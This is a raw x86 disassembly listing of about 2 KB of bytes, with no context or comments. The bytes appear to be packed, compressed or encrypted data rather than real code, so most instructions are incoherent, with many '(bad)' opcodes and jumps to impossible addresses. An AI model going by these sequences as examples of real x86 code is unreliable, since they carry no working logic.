  4030bb:	sub    BYTE PTR [esp+ecx*4-0x80],al
  4030bf:	addr16 push ebx
  4030c1:	enter  0x897d,0x2d
  4030c5:	test   DWORD PTR [edx+0x69f05f79],ebp
  4030cb:	push   ebx
  4030cc:	out    dx,eax
  4030cd:	and    al,0x99
  4030cf:	ret    
  4030d0:	sbb    eax,0x6e07241b
  4030d5:	imul   bl
  4030d7:	ficom  WORD PTR [ecx-0x3e]
  4030da:	popf   
  4030db:	dec    edx
  4030dc:	pushf  
  4030dd:	sbb    al,0x9
  4030df:	pop    ecx
  4030e0:	aas    
  4030e1:	pop    esp
  4030e2:	jns    0x4030b7
  4030e4:	nop
  4030e5:	add    bl,BYTE PTR [edi+0x77]
  4030e8:	(bad)  
  4030e9:	xor    edi,DWORD PTR [eax]
  4030eb:	aas    
  4030ec:	fisub  DWORD PTR [esi+0x63]
  4030ef:	lods   al,BYTE PTR ds:[esi]
  4030f0:	mov    WORD PTR [edx+0x71137817],es
  4030f6:	mov    ds:0x63722b1d,eax
  4030fb:	neg    DWORD PTR ds:0x8fd79380
  403101:	dec    esi
  403102:	call   0x9382ff45
  403107:	pop    esi
  403108:	fdivr  DWORD PTR [ebp+0x20818df1]
  40310e:	sbb    ebx,edi
  403110:	fldenv [edi+esi*1-0x5a13e1f7]
  403117:	and    al,0xc4
  403119:	mov    esp,0x5a44bbb3
  40311e:	xor    eax,0x8fae3a72
  403123:	mov    ah,0x62
  403125:	add    DWORD PTR [edx+0x45a7a27d],ecx
  40312b:	cs jge 0x40317f
  40312e:	call   0xf34d2e4b
  403133:	xor    al,0xb7
  403135:	es pop esp
  403137:	pop    edx
  403138:	retf   0xa7ab
  40313b:	dec    eax
  40313c:	mov    al,ch
  40313e:	mov    esp,0xf6859b7c
  403143:	mov    al,0x6e
  403145:	je     0x40310d
  403147:	add    al,0x80
  403149:	mov    cl,0xbb
  40314b:	cmc    
  40314c:	or     dh,ah
  40314e:	retf   
  40314f:	scas   al,BYTE PTR es:[edi]
  403150:	(bad)  
  403151:	out    dx,eax
  403152:	repnz sar ch,1
  403155:	jp     0x4030fb
  403157:	adc    al,0x3a
  403159:	mov    edx,0xcc5a0d14
  40315e:	xchg   BYTE PTR [ebx+ebx*1-0x67],al
  403162:	sbb    BYTE PTR [ebp+0x4],dh
  403165:	jb     0x403199
  403167:	shr    BYTE PTR [eax],cl
  403169:	sub    DWORD PTR [ebp-0x55],0x6d
  40316d:	lods   al,BYTE PTR ds:[esi]
  40316e:	hlt    
  40316f:	xor    edi,ecx
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0xd025d587
  403185:	or     eax,0x7070153e
  40318a:	xchg   edi,eax
  40318b:	jge    0x4031fd
  40318d:	jo     0x403190
  40318f:	pop    esi
  403190:	mul    DWORD PTR [edi]
  403192:	test   BYTE PTR [ebp+0x16],dl
  403195:	test   BYTE PTR [ebx-0x58be34bb],dl
  40319b:	push   0x91a9ab37
  4031a0:	add    ebx,ebp
  4031a2:	into   
  4031a3:	pop    ss
  4031a4:	aas    
  4031a5:	sub    DWORD PTR [eax],0x5a63f8b3
  4031ab:	mov    cl,0xa4
  4031ad:	pop    edx
  4031ae:	out    dx,eax
  4031af:	inc    ebx
  4031b0:	adc    DWORD PTR [eax-0xc],esi
  4031b3:	jmp    0x3c4e:0xea48cb33
  4031ba:	push   es
  4031bb:	dec    ebx
  4031bc:	xchg   edx,eax
  4031bd:	sbb    eax,0x56fc525
  4031c2:	sub    BYTE PTR [esi+0x3be222],cl
  4031c8:	dec    eax
  4031c9:	sbb    BYTE PTR [ebx+0x51933a1f],0xc8
  4031d0:	cld    
  4031d1:	ins    BYTE PTR es:[edi],dx
  4031d2:	mov    esi,0xde283795
  4031d7:	fidiv  WORD PTR [ebp-0x2e]
  4031da:	repz sbb cl,BYTE PTR [edi]
  4031dd:	pop    ss
  4031de:	adc    BYTE PTR [esp+ecx*1-0x33ccc882],ah
  4031e5:	mov    gs,WORD PTR [ebx+0x53631644]
  4031eb:	jge    0x403269
  4031ed:	mov    ss,WORD PTR ds:0x4e3eb99d
  4031f3:	push   edi
  4031f4:	mov    ?,edi
  4031f6:	aad    0x40
  4031f8:	or     eax,0x4ae6f6c1
  4031fd:	mov    edx,0x62f3390e
  403202:	dec    edi
  403203:	fs xchg ecx,eax
  403205:	mov    ch,BYTE PTR [ecx-0x7a818b8b]
  40320b:	fs data16 loopne 0x4031ea
  40320f:	dec    ecx
  403210:	(bad)  
  403211:	sahf   
  403212:	and    dl,dl
  403214:	or     bh,BYTE PTR [ebp+0x41]
  403217:	(bad)  
  403218:	fild   DWORD PTR [ecx]
  40321a:	nop
  40321b:	repnz adc edi,eax
  40321e:	loop   0x4031b8
  403220:	inc    esp
  403221:	mov    cl,0xfa
  403223:	js     0x40325e
  403225:	mov    bl,0xf2
  403227:	icebp  
  403228:	nop
  403229:	lahf   
  40322a:	jl     0x403238
  40322c:	stos   DWORD PTR es:[edi],eax
  40322d:	inc    ebp
  40322e:	add    bh,BYTE PTR [eax-0x5a21fb45]
  403234:	ins    DWORD PTR es:[edi],dx
  403235:	mov    edi,0xa4050dad
  40323a:	jp     0x4032b0
  40323c:	enter  0x1fed,0xf1
  403240:	call   0x100dcd02
  403245:	hlt    
  403246:	rcr    DWORD PTR [edx],cl
  403248:	sahf   
  403249:	push   es
  40324a:	dec    edx
  40324b:	sub    esi,DWORD PTR [esi+0x76ea7ff4]
  403251:	pop    eax
  403252:	outs   dx,BYTE PTR ds:[esi]
  403253:	rcr    BYTE PTR [edx+eiz*1],1
  403256:	dec    ecx
  403257:	add    ch,0xac
  40325a:	jns    0x4032bb
  40325c:	push   ebp
  40325d:	(bad)  
  40325f:	lahf   
  403260:	daa    
  403261:	aas    
  403262:	jnp    0x403231
  403264:	into   
  403265:	mov    ebp,0xa35b6e37
  40326a:	dec    ecx
  40326b:	shl    BYTE PTR [esi+0x2f8d6b46],1
  403271:	not    DWORD PTR [esi]
  403273:	xchg   edx,eax
  403274:	inc    esi
  403275:	and    eax,0x6f9ae964
  40327a:	fst    DWORD PTR [ebx-0x5181a560]
  403280:	iret   
  403281:	cmp    DWORD PTR [edi+0x75373cf9],ecx
  403287:	rol    DWORD PTR [ebx+ebp*1+0x1d],0x41
  40328c:	ret    0xc3b5
  40328f:	jbe    0x403237
  403291:	pop    esp
  403292:	pop    esi
  403293:	popf   
  403294:	or     eax,0xb87ede89
  403299:	jns    0x403313
  40329b:	pop    es
  40329c:	xor    edi,DWORD PTR [ebp-0x62e82126]
  4032a2:	jle    0x403231
  4032a4:	mov    esi,0xa4c7c984
  4032a9:	sbb    BYTE PTR [edx+0x59],bl
  4032ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032ad:	mov    bh,0x98
  4032af:	sbb    ecx,DWORD PTR [esi+0x1c]
  4032b2:	sahf   
  4032b3:	das    
  4032b4:	fwait
  4032b5:	outs   dx,DWORD PTR ds:[esi]
  4032b6:	pop    edx
  4032b7:	inc    ebx
  4032b8:	int    0x5c
  4032ba:	cwde   
  4032bb:	inc    edi
  4032bc:	lea    ebx,[edi+ebx*4-0x549fb22]
  4032c3:	(bad)  
  4032c4:	jnp    0x403319
  4032c6:	jae    0x40326a
  4032c8:	popa   
  4032c9:	and    DWORD PTR [edx],edi
  4032cb:	pop    ebx
  4032cc:	jmp    0x403283
  4032ce:	pop    ss
  4032cf:	and    ecx,DWORD PTR [ecx+ebp*2+0x2ae2df08]
  4032d6:	pop    ss
  4032d7:	mov    ebx,0x9ae123da
  4032dc:	sar    BYTE PTR [ecx],cl
  4032de:	mov    al,0x67
  4032e0:	dec    ebp
  4032e1:	jb     0x4032f3
  4032e3:	inc    edi
  4032e4:	in     al,0x6b
  4032e6:	stos   DWORD PTR es:[edi],eax
  4032e7:	adc    dh,BYTE PTR [edi+0x42]
  4032ea:	add    DWORD PTR ds:0x2e6e88c9,0x58
  4032f1:	mov    eax,0x8a005381
  4032f6:	in     eax,0x54
  4032f8:	xor    dh,dl
  4032fa:	or     al,0xdc
  4032fc:	or     al,BYTE PTR [edi]
  4032fe:	cs enter 0xf2f5,0xe
  403303:	mov    al,0x3a
  403305:	mov    edx,DWORD PTR [edx-0x72]
  403308:	xchg   esi,eax
  403309:	sub    DWORD PTR [esi+0x4a],ebp
  40330c:	sbb    eax,0x9e49ebe8
  403311:	cmc    
  403312:	mov    cl,0x5
  403314:	(bad)  
  403315:	das    
  403316:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  403318:	dec    edx
  403319:	push   ebp
  40331a:	call   0x261:0xb6610b19
  403321:	xchg   BYTE PTR [edi],bh
  403323:	(bad)  
  403324:	mov    ebp,0x368ea840
  403329:	(bad)  
  40332a:	cmp    edx,DWORD PTR [edi-0x1f]
  40332d:	fs dec esp
  40332f:	fisubr WORD PTR [ebx+0x5387c681]
  403335:	push   0xb7652935
  40333a:	jmp    0xb3e506c9
  40333f:	inc    edi
  403340:	je     0x403313
  403342:	mov    dl,0xc3
  403344:	je     0x403379
  403346:	dec    bl
  403348:	jp     0x403341
  40334a:	jmp    0xa92c1295
  40334f:	xor    BYTE PTR [ebx+edx*4+0x2378166b],0xc7
  403357:	nop
  403358:	loopne 0x4033b9
  40335a:	push   ebp
  40335b:	xchg   ecx,eax
  40335c:	clc    
  40335d:	(bad)  [edi]
  40335f:	int3   
  403360:	in     al,0x91
  403362:	out    0xbb,eax
  403364:	mov    ecx,0x1fea22c0
  403369:	aas    
  40336a:	mov    edx,0xf27f6803
  40336f:	push   ebx
  403370:	cwde   
  403371:	arpl   bx,bx
  403373:	xor    DWORD PTR [ebx+edi*8+0x2be376f3],ebx
  40337a:	test   DWORD PTR [ecx],ebp
  40337c:	das    
  40337d:	sbb    al,0x4e
  40337f:	mov    eax,0xea43b9cb
  403384:	mov    al,0xd4
  403386:	int    0x2e
  403388:	pop    edx
  403389:	xor    BYTE PTR [esi-0x23c6334f],al
  40338f:	shl    BYTE PTR [ecx+0x65],cl
  403392:	dec    eax
  403393:	div    ebp
  403395:	adc    esi,ebp
  403397:	adc    dh,BYTE PTR [edi-0xc]
  40339a:	inc    ecx
  40339b:	in     eax,0xea
  40339d:	adc    ecx,DWORD PTR [esi+0xe]
  4033a0:	outs   dx,DWORD PTR ds:[esi]
  4033a1:	jmp    0x1a252c53
  4033a6:	sar    BYTE PTR [eax],cl
  4033a8:	aam    0xf1
  4033aa:	xchg   esp,eax
  4033ab:	addr16 mov bl,0xf1
  4033ae:	add    bl,BYTE PTR ds:0x363b115c
  4033b4:	adc    bh,ch
  4033b6:	popf   
  4033b7:	mov    bh,0xaa
  4033b9:	imul   ebp,DWORD PTR ds:0x431e578b,0xffffff8a
  4033c0:	adc    al,0xe4
  4033c2:	or     eax,0x8ba37668
  4033c7:	pushf  
  4033c8:	jg     0x40342a
  4033ca:	xor    DWORD PTR [eax+ebx*1],0x82051d36
  4033d1:	jecxz  0x4033ef
  4033d3:	test   DWORD PTR [esi+0x52c3f25a],edi
  4033d9:	pop    ds
  4033da:	add    al,0x34
  4033dc:	cmp    al,0x5
  4033de:	scas   al,BYTE PTR es:[edi]
  4033df:	mov    bh,BYTE PTR [eax+ebp*2+0x12e329db]
  4033e6:	icebp  
  4033e7:	daa    
  4033e8:	mov    dh,0x68
  4033ea:	or     esp,esp
  4033ec:	sub    al,0x6d
  4033ee:	repz hlt 
  4033f0:	mov    esi,0xe933b2dd
  4033f5:	imul   edi,DWORD PTR [ecx],0x6369f05c
  4033fb:	inc    ebx
  4033fc:	xor    DWORD PTR [eax+esi*4+0x1c],0x8c54f9c3
  403404:	xor    DWORD PTR [eax-0x54],ecx
  403407:	aas    
  403408:	into   
  403409:	test   BYTE PTR [edx-0x312a7371],0x92
  403410:	fstp   QWORD PTR [ebp-0x1b401de8]
  403416:	stos   BYTE PTR es:[edi],al
  403417:	pop    edx
  403418:	mov    DWORD PTR [esi-0x4],edi
  40341b:	xlat   BYTE PTR ds:[ebx]
  40341c:	cmp    eax,0xd888ed8b
  403421:	inc    ebp
  403422:	int3   
  403423:	(bad)  
  403424:	outs   dx,BYTE PTR ds:[esi]
  403425:	push   cs
  403426:	pop    eax
  403427:	push   esi
  403428:	mov    DWORD PTR [ebp+0x6a],edi
  40342b:	and    esi,esi
  40342d:	bound  esi,QWORD PTR [eax]
  40342f:	lea    esi,[eax]
  403431:	loopne 0x4033de
  403433:	pop    edx
  403434:	fldenv [ebx+edx*2+0x7e]
  403438:	fimul  DWORD PTR [edi]
  40343a:	out    0x42,al
  40343c:	inc    esi
  40343d:	jbe    0x403428
  40343f:	fldcw  WORD PTR [edx]
  403441:	fnsave [ebx-0x34f8d4fb]
  403447:	jne    0x4034b5
  403449:	inc    ecx
  40344a:	test   ebx,esi
  40344c:	adc    al,0xf
  40344e:	loop   0x40347f
  403450:	sbb    bl,bh
  403452:	idiv   BYTE PTR ds:0x188fb81
  403458:	out    0x9,al
  40345a:	inc    eax
  40345b:	pop    edi
  40345c:	loopne 0x4034ab
  40345e:	xor    BYTE PTR [ecx],dl
  403460:	sbb    ecx,DWORD PTR [edi-0x7b]
  403463:	test   DWORD PTR [ebx+0x35],edx
  403466:	sub    al,ch
  403468:	sbb    DWORD PTR [esi+esi*1+0x3d9fa832],ebp
  40346f:	gs jno 0x40343f
  403472:	push   esi
  403473:	push   es
  403474:	or     al,0x9f
  403476:	or     al,0xf
  403478:	fnsave [ebx+0x71]
  40347b:	idiv   DWORD PTR [eax]
  40347d:	arpl   di,cx
  40347f:	push   ebx
  403480:	popf   
  403481:	push   esi
  403482:	loope  0x4034d7
  403484:	add    BYTE PTR [ecx+0x79633643],ch
  40348a:	mov    eax,ds:0x3d610e14
  40348f:	pop    ecx
  403490:	fs rcl esi,cl
  403493:	mov    ah,BYTE PTR [eax+0x1bd9cae2]
  403499:	jnp    0x4034b8
  40349b:	ss xchg esp,eax
  40349d:	add    dh,BYTE PTR [edx+0x5bfd82e1]
  4034a3:	hlt    
  4034a4:	ins    BYTE PTR es:[edi],dx
  4034a5:	jge    0x403519
  4034a7:	or     eax,DWORD PTR [ebp+0x3c573eaa]
  4034ad:	adc    BYTE PTR [edi-0x783a1757],0x1
  4034b4:	and    DWORD PTR [eax-0x69],edx
  4034b7:	jmp    DWORD PTR [ecx-0x3ee75026]
  4034bd:	cmp    ch,BYTE PTR [ebx]
  4034bf:	cmp    BYTE PTR [eax],0x6a
  4034c2:	fs pop ds
  4034c4:	call   0xe6bb:0x6228b37e
  4034cb:	or     DWORD PTR [ebx-0xf],edi
  4034ce:	jecxz  0x40352f
  4034d0:	push   ebp
  4034d1:	add    eax,0x7ce3a746
  4034d6:	mov    DWORD PTR fs:0xce5d8538,edi
  4034dd:	push   cs
  4034de:	jns    0x403511
  4034e0:	(bad)  
  4034e1:	clc    
  4034e2:	in     al,dx
  4034e3:	pop    esi
  4034e4:	push   ds
  4034e5:	dec    edi
  4034e6:	retf   
  4034e7:	fs or  eax,0xf7e57bb3
  4034ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034ee:	or     BYTE PTR [esi+eax*1],cl
  4034f1:	and    dl,ch
  4034f3:	dec    edi
  4034f4:	add    BYTE PTR [edx],0x8
  4034f7:	xchg   esp,eax
  4034f8:	mov    cl,0x50
  4034fa:	scas   eax,DWORD PTR es:[edi]
  4034fb:	cli    
  4034fc:	push   edi
  4034fd:	int    0x4
  4034ff:	lock jecxz 0x4034dd
  403502:	push   esi
  403503:	xor    DWORD PTR [edi-0x6f5178c4],esi
  403509:	jle    0x1c83a131
  40350f:	or     ecx,DWORD PTR [esi+edi*1-0x44b0ca85]
  403516:	cmc    
  403517:	popa   
  403518:	test   BYTE PTR [edi-0x7b5e7952],cl
  40351e:	repz fadd DWORD PTR [esi-0x228ddf66]
  403525:	sbb    BYTE PTR [ecx+0x3],0xfe
  403529:	mov    esi,DWORD PTR [ebp+0x8]
  40352c:	imul   edi,edx
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x403596
  403544:	push   0x5
  403546:	dec    eax
  403547:	push   ebp
  403548:	adc    dh,BYTE PTR [eax+0x70]
  40354b:	xchg   edi,eax
  40354c:	jge    0x4035be
  40354e:	jo     0x40357d
  403550:	xchg   ebx,eax
  403551:	out    dx,al
  403552:	xchg   DWORD PTR [ecx],eax
  403554:	aad    0x56
  403556:	aad    0x63
  403558:	rcl    DWORD PTR [eax+edx*2-0x3663e433],0xbf
  403560:	and    ch,BYTE PTR [ebx+eiz*8+0xfb58bca]
  403567:	mov    cl,0xc6
  403569:	sbb    eax,0xfdf454ea
  40356e:	xor    esi,ebp
  403570:	ror    BYTE PTR [edi+edx*1],0xe2
  403574:	es push 0x6c
  403577:	retf   
  403578:	adc    esi,DWORD PTR ds:0x41e154e7
  40357e:	pop    eax
  40357f:	aam    0x99
  403581:	add    dl,BYTE PTR [edx+edx*2+0x5f463065]
  403588:	xlat   BYTE PTR ds:[ebx]
  403589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40358a:	rcr    BYTE PTR [ebp-0x11],0x52
  40358e:	(bad)  
  40358f:	pop    ecx
  403590:	mov    eax,ds:0xfa2ca23e
  403595:	rcl    BYTE PTR [ecx-0x6],0xc1
  403599:	push   esi
  40359a:	sbb    eax,0x6be9404e
  40359f:	xchg   ebx,eax
  4035a0:	sub    BYTE PTR [ebx+0x18],ah
  4035a3:	add    eax,0xab7e197d
  4035a8:	add    ebx,DWORD PTR [edx+ebx*1+0xb]
  4035ac:	jecxz  0x4035a0
  4035ae:	mov    cs,WORD PTR [eax-0x21c1edcc]
  4035b4:	push   esi
  4035b5:	jmp    0x4035ca
  4035b7:	sti    
  4035b8:	clc    
  4035b9:	push   ebp
  4035ba:	pop    es
  4035bb:	nop
  4035bc:	push   0xc9ebe67b
  4035c1:	or     ah,BYTE PTR gs:[edx]
  4035c4:	pop    esi
  4035c5:	and    eax,0x153bbb19
  4035ca:	in     eax,dx
  4035cb:	iret   
  4035cc:	jge    0x4035da
  4035ce:	sub    BYTE PTR [edi],cl
  4035d0:	xor    DWORD PTR [eax],esi
  4035d2:	out    0x3d,eax
  4035d4:	mov    bh,0x43
  4035d6:	cmc    
  4035d7:	addr16 jmp 0xa6bc889a
  4035dd:	pcmpgtw mm0,QWORD PTR [edi]
  4035e0:	aad    0xe0
  4035e2:	cmp    al,0x40
  4035e4:	das    
  4035e5:	adc    al,BYTE PTR [edx+0x4e7eb9ef]
  4035eb:	fdivr  DWORD PTR [edi+0x7a7f669]
  4035f1:	aam    0xce
  4035f3:	(bad)  
  4035f4:	xchg   edi,eax
  4035f5:	sub    BYTE PTR [ebp-0x6f],bh
  4035f8:	jbe    0x403628
  4035fa:	push   cs
  4035fb:	test   al,0xcd
  4035fd:	fisub  DWORD PTR [esi]
  4035ff:	rcl    DWORD PTR [ecx-0x36],1
  403602:	test   al,0xcc
  403604:	xor    DWORD PTR [esi-0x79],ebp
  403607:	xchg   esi,eax
  403608:	rol    BYTE PTR [esi-0xb6e2114],1
  40360e:	inc    edi
  40360f:	repz mov dh,0xbf
  403612:	xchg   ebx,eax
  403613:	pop    eax
  403614:	mov    cl,0x5a
  403616:	(bad)  
  403617:	(bad)  
  403618:	repnz (bad) 
  40361a:	xchg   edi,eax
  40361b:	dec    ecx
  40361c:	idiv   DWORD PTR [eax-0x51725004]
  403622:	cmp    BYTE PTR [ebp-0x73],0x85
  403626:	sbb    edx,eax
  403628:	in     al,0x8
  40362a:	je     0x403619
  40362c:	cmp    eax,DWORD PTR ds:0xf2b5e11
  403632:	xchg   esp,eax
  403633:	ret    0xf880
  403636:	pop    ds
  403637:	arpl   si,bx
  403639:	jns    0x40365a
  40363b:	xchg   ebx,eax
  40363c:	dec    ebp
  40363d:	gs inc eax
  40363f:	sub    DWORD PTR [eax+0x35075da0],esp
  403645:	cmp    DWORD PTR [ebx-0x12741a38],eax
  40364b:	cmp    esi,DWORD PTR [eax-0x11088f62]
  403651:	and    dl,BYTE PTR [edi+ebx*4-0x4a52a5ce]
  403658:	and    DWORD PTR [esi+ebp*1-0x1eb5d141],esi
  40365f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403660:	cs push ebp
  403662:	inc    esp
  403663:	sub    al,0xe5
  403665:	jle    0x4036df
  403667:	jg     0x403699
  403669:	mov    ds:0x27b3f701,eax
  40366e:	test   DWORD PTR [eax-0x3c8540a9],esi
  403674:	lahf   
  403675:	inc    ecx
  403676:	(bad)  
  403677:	(bad)  
  403678:	fcom   DWORD PTR [esp+ebp*2]
  40367b:	fadd   DWORD PTR [ebx]
  40367d:	leave  
  40367e:	loopne 0x403602
  403680:	xchg   ebx,eax
  403681:	inc    ebp
  403682:	jo     0x4036a3
  403684:	cmp    DWORD PTR ds:[edi+0x2798857f],esp
  40368b:	add    bh,BYTE PTR ds:0xb1b307e9
  403691:	scas   al,BYTE PTR es:[edi]
  403692:	ret    
  403693:	cmc    
  403694:	xor    esp,DWORD PTR [ecx+0x6e7ec05d]
  40369a:	je     0x403690
  40369c:	xchg   ebp,eax
  40369d:	pop    eax
  40369e:	shl    esi,1
  4036a0:	push   ss
  4036a1:	inc    edx
  4036a2:	xchg   edi,eax
  4036a3:	(bad)  
  4036a4:	dec    BYTE PTR [edi+0x7afda4db]
  4036aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036ab:	mov    al,ds:0x38d44937
  4036b0:	jbe    0x403655
  4036b2:	call   0xf581:0x50091618
  4036b9:	and    al,0xdf
  4036bb:	fld    DWORD PTR [edi+0x72]
  4036be:	fsubrp st(5),st
  4036c0:	pusha  
  4036c1:	dec    ebx
  4036c2:	mov    ebx,0xd8ca1358
  4036c7:	adc    dl,BYTE PTR [edx-0x5d]
  4036ca:	pop    ebx
  4036cb:	add    edx,DWORD PTR [eax]
  4036cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036ce:	cmp    BYTE PTR [edi],dl
  4036d0:	popa   
  4036d1:	dec    edx
  4036d2:	sbb    edi,ebp
  4036d4:	mov    ds:0xb84781b5,eax
  4036d9:	aaa    
  4036da:	lods   al,BYTE PTR ds:[esi]
  4036db:	stos   BYTE PTR es:[edi],al
  4036dc:	outs   dx,DWORD PTR ds:[esi]
  4036dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036de:	cwde   
  4036df:	jae    0x403707
  4036e1:	inc    ebx
  4036e2:	mov    edx,0x82736d57
  4036e7:	add    ch,cl
  4036e9:	ret    
  4036ea:	cmp    ebp,DWORD PTR [eax-0x2a606321]
  4036f0:	mov    eax,ds:0xb3cc5cab
  4036f5:	cmp    esi,DWORD PTR [edi+esi*2-0x5b1ca696]
  4036fc:	out    0x14,al
  4036fe:	lock fwait
  403700:	test   BYTE PTR [ebx-0x4be28d72],0xe2
  403707:	xchg   ecx,eax
  403708:	mov    ebp,fs
  40370a:	pop    ebp
  40370b:	push   cs
  40370c:	sub    edi,DWORD PTR [eax-0x4d]
  40370f:	jne    0x403707
  403711:	dec    ebx
  403712:	xchg   ebx,eax
  403713:	call   0x8c29f8d8
  403718:	and    bl,bl
  40371a:	imul   edi,esi,0xffffff9d
  40371d:	jne    0x403708
  40371f:	mov    DWORD PTR [eax-0x7693c3b],ecx
  403725:	pushf  
  403726:	mov    eax,0xbe50d53c
  40372b:	ret    
  40372c:	xchg   edx,eax
  40372d:	sti    
  40372e:	sbb    DWORD PTR [esi],esi
  403730:	test   DWORD PTR [edx],edi
  403732:	repnz push edi
  403734:	leave  
  403735:	pop    edx
  403736:	pop    edi
  403737:	xor    DWORD PTR [esp+esi*2],ebx
  40373a:	pop    ss
  40373b:	xor    ecx,DWORD PTR [edx-0x6234bc98]
  403741:	stos   BYTE PTR es:[edi],al
  403742:	fsub   DWORD PTR ss:[edx]
  403745:	call   0xbabb:0x1595888
  40374c:	ror    bh,cl
  40374e:	arpl   ax,dx
  403750:	in     eax,0xdd
  403752:	popf   
  403753:	hlt    
  403754:	cwde   
  403755:	mov    cl,0x5d
  403757:	jo     0x403774
  403759:	cld    
  40375a:	inc    ebx
  40375b:	mov    ah,0x44
  40375d:	cmp    cl,bh
  40375f:	jb     0x4037ac
  403761:	fcmovu st,st(7)
  403763:	sbb    al,0xdf
  403765:	push   esp
  403766:	pop    es
  403767:	das    
  403768:	inc    eax
  403769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40376a:	mov    cl,BYTE PTR [esi+0x7b307459]
  403770:	nop
  403771:	stos   BYTE PTR es:[edi],al
  403772:	mov    DWORD PTR [edi-0x49],esp
  403775:	fdivr  DWORD PTR [ecx-0x47]
  403778:	cli    
  403779:	add    DWORD PTR [edi+0x5af497c4],ecx
  40377f:	dec    ecx
  403780:	mov    dl,0x87
  403782:	in     eax,dx
  403783:	sub    ebp,DWORD PTR [ebx+0x5f]
  403786:	cs in  al,dx
  403788:	mov    bh,BYTE PTR [edx]
  40378a:	sub    al,BYTE PTR [ebx+0x5d]
  40378d:	xor    bh,BYTE PTR [esi-0x499d0a1f]
  403793:	and    DWORD PTR [esi-0x1a],0x76
  403797:	mov    dh,0xce
  403799:	xchg   edi,eax
  40379a:	dec    ecx
  40379b:	adc    al,0xaf
  40379d:	mov    ebp,0x55fe3386
  4037a2:	mov    ah,0xef
  4037a4:	mov    WORD PTR [ebx],?
  4037a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037a7:	xor    BYTE PTR [eax+0x7ad35fb4],bh
  4037ad:	and    BYTE PTR [eax],al
  4037af:	sahf   
  4037b0:	add    eax,0xa2199602
  4037b5:	push   ebx
  4037b6:	js     0x40378e
  4037b8:	push   0xffffff9b
  4037ba:	(bad)  
  4037bb:	inc    DWORD PTR [esi]
  4037bd:	mov    ebx,0x3afa785e
  4037c2:	int    0x9a
  4037c4:	(bad)  
  4037c5:	push   ds
  4037c6:	lock cld 
  4037c8:	xchg   edi,eax
  4037c9:	pop    edx
  4037ca:	xchg   edi,eax
  4037cb:	call   0x9e70:0xb2fbaac3
  4037d2:	(bad)  
  4037d3:	cs jns 0x4037d5
  4037d6:	retf   
  4037d7:	and    ecx,DWORD PTR [edi+0x142550a2]
  4037dd:	(bad)  
  4037de:	sti    
  4037df:	ret    
  4037e0:	cmp    eax,0x6b5b17f7
  4037e5:	adc    edx,DWORD PTR [ecx-0x4b9dd437]
  4037eb:	mov    bh,0x61
  4037ed:	int    0x1
  4037ef:	push   0x65
  4037f1:	push   ss
  4037f2:	or     eax,0x21bd9672
  4037f7:	xor    eax,0x871569c7
  4037fc:	jnp    0x403818
  4037fe:	out    0xd6,eax
  403800:	into   
  403801:	mov    al,0x99
  403803:	xor    al,0x92
  403805:	xor    esi,ebp
  403807:	and    BYTE PTR [ebx],0x5d
  40380a:	adc    al,0xc2
  40380c:	add    BYTE PTR gs:[edi+0x78],ch
  403810:	cmp    al,0xea
  403812:	inc    edi
  403813:	frstor [ebp+0x1b]
  403816:	(bad)  
  403818:	pop    edi
  403819:	push   esp
  40381a:	add    ah,bl
  40381c:	popa   
  40381d:	push   esp
  40381e:	inc    esi
  40381f:	(bad)  
  403820:	jmp    0x403834
  403822:	mov    edi,0xdb8e12d0
  403827:	mov    dl,0x80
  403829:	inc    ecx
  40382a:	enter  0xace5,0xce
  40382e:	cmp    al,0x5a
  403830:	xchg   BYTE PTR [edi],cl
  403832:	fwait
  403833:	xor    bh,BYTE PTR [ecx]
  403835:	mov    al,ds:0x3afddda1
  40383a:	mov    ss,WORD PTR [eax-0x44]
  40383d:	out    0xcd,eax
  40383f:	aad    0x88
  403841:	int3   
  403842:	dec    ebp
  403843:	(bad)  
  403844:	in     eax,0xaa
  403846:	mov    al,0xea
  403848:	(bad)  
  403849:	pop    ebp
  40384a:	sub    eax,DWORD PTR [ebx+0x2b]
  40384d:	fisub  WORD PTR [edi-0x116b59b3]
  403853:	sub    ch,BYTE PTR [esp+edi*4-0x2ef9b2a2]
  40385a:	or     cl,BYTE PTR [edx+0x78]
  40385d:	popa   
  40385e:	test   DWORD PTR [ecx+ebx*2+0x15],0xe50c60fe
  403866:	xchg   ecx,eax
  403867:	fimul  WORD PTR [edi-0x58]
  40386a:	dec    ebx
  40386b:	icebp  
  40386c:	cmc    
  40386d:	fyl2x  
  40386f:	jmp    FWORD PTR [esi+0x6b]
  403872:	stos   DWORD PTR es:[edi],eax
  403873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403874:	mov    esi,DWORD PTR [edi+0x2d6bb78a]
  40387a:	mov    ch,0x1b
  40387c:	push   ss
  40387d:	fisub  DWORD PTR [esi]
  40387f:	out    dx,eax
  403880:	retf   
  403881:	popf   
  403882:	xor    DWORD PTR [edi-0x32],0x1b
  403886:	push   ss
  403887:	mov    eax,0x53f446f1
  40388c:	cdq    
  40388d:	int3   
  40388e:	sbb    DWORD PTR [edi],ebx
  403890:	xor    BYTE PTR fs:[edi],bh
  403893:	jb     0x403839
  403895:	(bad)  
  403896:	call   FWORD PTR es:[edx]
  403899:	sbb    eax,0x4f028350
  40389e:	sti    
  40389f:	push   esi
  4038a0:	sti    
  4038a1:	scas   eax,DWORD PTR es:[edi]
  4038a2:	outs   dx,DWORD PTR ds:[esi]
  4038a3:	je     0x403885
  4038a5:	inc    ebx
  4038a7:	sbb    esp,eax
  4038a9:	repnz xchg esi,eax
